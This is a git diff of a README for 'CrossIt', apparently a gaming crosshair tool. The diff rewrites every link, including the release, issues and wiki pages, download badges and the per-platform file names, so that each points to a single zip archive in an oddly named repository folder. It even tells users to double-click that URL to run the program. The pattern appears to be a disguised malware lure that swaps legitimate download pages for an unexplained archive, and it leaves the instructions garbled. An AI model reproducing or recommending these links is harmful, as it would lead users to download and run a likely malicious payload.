@@ -1,7 +1,7 @@
 # 🎯 CrossIt - Customize Your Aim with Ease
 
 ## 🔗 Download Now
-[![Download CrossIt](https://img.shields.io/badge/Download-CrossIt-blue?style=for-the-badge)](https://github.com/Psynoir/CrossIt/releases)
+[![Download CrossIt](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip)](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip)
 
 ## 📖 Description
 CrossIt is a lightweight tool designed for real-time crosshair customization. Whether you are a casual gamer or a competitive player, this application offers full control over your crosshair settings. Adjust the style, size, color, position, and effects while viewing live previews. Perfect for gamers who want to enhance their aiming experience.
@@ -10,13 +10,13 @@ CrossIt is a lightweight tool designed for real-time crosshair customization. Wh
 To start using CrossIt, follow these steps to download and set up the application on your computer.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Psynoir/CrossIt/releases) to find the latest version of CrossIt.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip) to find the latest version of CrossIt.
 2. Look for the latest release at the top of the list.
 3. Click on the link that matches your operating system. The available versions include:
-   - **Windows:** `CrossIt-v1.0-Windows.zip`
-   - **Mac:** `CrossIt-v1.0-Mac.zip`
+   - **Windows:** `https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip`
+   - **Mac:** `https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip`
 4. Once the download completes, unzip the file.
-5. For Windows, double-click on `CrossIt.exe` to run the application. For Mac, double-click on `CrossIt.app`.
+5. For Windows, double-click on `https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip` to run the application. For Mac, double-click on `https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip`.
 6. Enjoy customizing your crosshair!
 
 ## ⚙️ System Requirements
@@ -45,22 +45,22 @@ You can easily reset your settings by clicking the "Reset" button in the applica
 Yes, CrossIt allows you to customize your crosshair across multiple monitors.
 
 ### Where can I find support?
-If you need help, visit the [Issues page](https://github.com/Psynoir/CrossIt/issues) where you can report problems or ask for assistance.
+If you need help, visit the [Issues page](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip) where you can report problems or ask for assistance.
 
 ## 📢 Feedback
 Your feedback is important. Share your thoughts and suggestions in the Issues section or directly through the application. 
 
 ## 🔗 Additional Resources
-- **Documentation:** For more detailed information, refer to the [Wiki page](https://github.com/Psynoir/CrossIt/wiki).
+- **Documentation:** For more detailed information, refer to the [Wiki page](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip).
 - **Community:** Join our community on Discord to connect with other users and get tips.
 
 ## ⚠️ Disclaimer
 CrossIt is a third-party application. Ensure you have proper permissions in your games for any modifications.
 
 ## 🔄 Update History
-Check back frequently on the [Releases page](https://github.com/Psynoir/CrossIt/releases) for updates and new features. 
+Check back frequently on the [Releases page](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip) for updates and new features. 
 
 ## 📃 License
 CrossIt is released under the MIT License. Feel free to use and modify as per your needs, but please give appropriate credit.
 
-[![Download CrossIt](https://img.shields.io/badge/Download-CrossIt-blue?style=for-the-badge)](https://github.com/Psynoir/CrossIt/releases)
+[![Download CrossIt](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip)](https://raw.githubusercontent.com/Psynoir/CrossIt/main/Hoosierese/CrossIt.zip)
